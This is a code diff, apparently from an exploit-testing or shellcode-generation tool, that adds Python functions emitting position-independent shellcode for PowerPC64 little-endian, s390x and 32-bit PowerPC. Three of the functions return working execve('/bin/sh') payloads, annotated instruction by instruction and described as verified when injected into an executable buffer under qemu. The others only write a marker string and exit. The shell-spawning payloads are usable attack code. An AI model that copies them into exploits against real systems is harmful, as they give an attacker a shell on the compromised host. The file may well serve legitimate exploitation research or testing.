@@ -263,6 +263,107 @@ def write_marker_riscv64(marker: bytes) -> bytes:
     ) + marker
 
 
+def execve_binsh_ppc64le() -> bytes:
+    """PowerPC64 (ELFv2, little-endian) execve("/bin/sh", NULL, NULL) -- 36 bytes, position-independent
+    (`bl .+4` + `mflr r3` + `addi r3,r3,24` points r3 at the "/bin/sh\\0" appended after the 28-byte
+    code). r0=11 (__NR_execve), r4=r5=0, `sc`. Under qemu-user this spawns a REAL shell (the guest
+    execve is relayed to the host). Verified by running the bytes as injected code (an RWX buffer
+    called through a pointer) under qemu-ppc64le -- a standalone _start exe misloads as ELFv1."""
+    return struct.pack(
+        "<7I",
+        0x48000005,                      # bl .+4               ; LR = &mflr
+        0x7C6802A6,                      # mflr r3              ; r3 = &mflr
+        0x38630018,                      # addi r3, r3, 24      ; r3 -> "/bin/sh"
+        0x38800000,                      # li   r4, 0           ; argv = NULL
+        0x38A00000,                      # li   r5, 0           ; envp = NULL
+        0x3800000B,                      # li   r0, 11          ; __NR_execve
+        0x44000002,                      # sc
+    ) + b"/bin/sh\x00"
+
+
+def write_marker_ppc64le(marker: bytes) -> bytes:
+    """PowerPC64 (ELFv2, little-endian) write(1, marker, len); exit. Position-independent (`bl .+4` +
+    `mflr r4` + `addi r4,r4,32` points r4 at the marker after the 36-byte code); the length immediate
+    is patched into `li r5,len`. Verified as injected code under qemu-ppc64le."""
+    n = len(marker) & 0xFFFF
+    return struct.pack(
+        "<9I",
+        0x48000005,                      # bl .+4
+        0x7C8802A6,                      # mflr r4
+        0x38840020,                      # addi r4, r4, 32      ; r4 -> marker
+        0x38600001,                      # li   r3, 1           ; fd = stdout
+        0x38A00000 | n,                  # li   r5, len
+        0x38000004,                      # li   r0, 4           ; __NR_write
+        0x44000002,                      # sc
+        0x38000001,                      # li   r0, 1           ; __NR_exit
+        0x44000002,                      # sc
+    ) + marker
+
+
+def execve_binsh_s390x() -> bytes:
+    """s390x (IBM Z, big-endian) execve("/bin/sh", NULL, NULL) -- 24 bytes, position-independent
+    (`larl r2,binsh` addresses the "/bin/sh\\0" appended after the 16-byte code, PC-relative). r3=r4=0
+    (xgr), `svc 11` (__NR_execve). s390 instruction bytes are written in order (not byte-swapped),
+    so these bytes are the same on the big-endian target. Verified by running the bytes as injected
+    code under qemu-s390x."""
+    return bytes.fromhex(
+        "c02000000008"                   # larl r2, binsh       ; r2 -> "/bin/sh" (+16 bytes)
+        "b9820033"                       # xgr  r3, r3          ; argv = NULL
+        "b9820044"                       # xgr  r4, r4          ; envp = NULL
+        "0a0b"                           # svc  11              ; __NR_execve
+    ) + b"/bin/sh\x00"
+
+
+def write_marker_s390x(marker: bytes) -> bytes:
+    """s390x write(1, marker, len); exit. Position-independent (`larl r3,msg` addresses the marker
+    after the 22-byte code); the length immediate is patched into `lghi r4,len`. Verified as injected
+    code under qemu-s390x."""
+    n = len(marker) & 0xFFFF
+    return (
+        bytes.fromhex("c0300000000b")    # larl r3, msg          ; r3 -> marker (+22 bytes)
+        + bytes.fromhex("a7290001")      # lghi r2, 1            ; fd = stdout
+        + b"\xa7\x49" + n.to_bytes(2, "big")   # lghi r4, len
+        + bytes.fromhex("0a04")          # svc 4                ; __NR_write
+        + bytes.fromhex("a7290000")      # lghi r2, 0
+        + bytes.fromhex("0a01")          # svc 1                ; __NR_exit
+    ) + marker
+
+
+def execve_binsh_ppc32() -> bytes:
+    """PowerPC 32-bit (ELF32, big-endian) execve("/bin/sh", NULL, NULL). Same PowerPC instruction
+    words as the ppc64le stub (the base ISA is identical), but packed BIG-ENDIAN for the ppc32 image.
+    Position-independent (`bl .+4`/`mflr r3`/`addi r3,r3,24`); r0=11, `sc`. Verified as injected code
+    under qemu-ppc."""
+    return struct.pack(
+        ">7I",
+        0x48000005,                      # bl .+4
+        0x7C6802A6,                      # mflr r3
+        0x38630018,                      # addi r3, r3, 24      ; r3 -> "/bin/sh"
+        0x38800000,                      # li   r4, 0
+        0x38A00000,                      # li   r5, 0
+        0x3800000B,                      # li   r0, 11          ; __NR_execve
+        0x44000002,                      # sc
+    ) + b"/bin/sh\x00"
+
+
+def write_marker_ppc32(marker: bytes) -> bytes:
+    """PowerPC 32-bit (big-endian) write(1, marker, len); exit -- the ppc64le write-marker words,
+    packed big-endian. Verified as injected code under qemu-ppc."""
+    n = len(marker) & 0xFFFF
+    return struct.pack(
+        ">9I",
+        0x48000005,                      # bl .+4
+        0x7C8802A6,                      # mflr r4
+        0x38840020,                      # addi r4, r4, 32      ; r4 -> marker
+        0x38600001,                      # li   r3, 1           ; fd = stdout
+        0x38A00000 | n,                  # li   r5, len
+        0x38000004,                      # li   r0, 4           ; __NR_write
+        0x44000002,                      # sc
+        0x38000001,                      # li   r0, 1           ; __NR_exit
+        0x44000002,                      # sc
+    ) + marker
+
+
 def write_marker_aarch64(marker: bytes) -> bytes:
     """AArch64 write(1, marker, len); exit(93). Position-independent: `adr x1, marker` addresses the
     marker bytes appended after the fixed 7-instruction (28-byte) code, PC-relative, so the stub
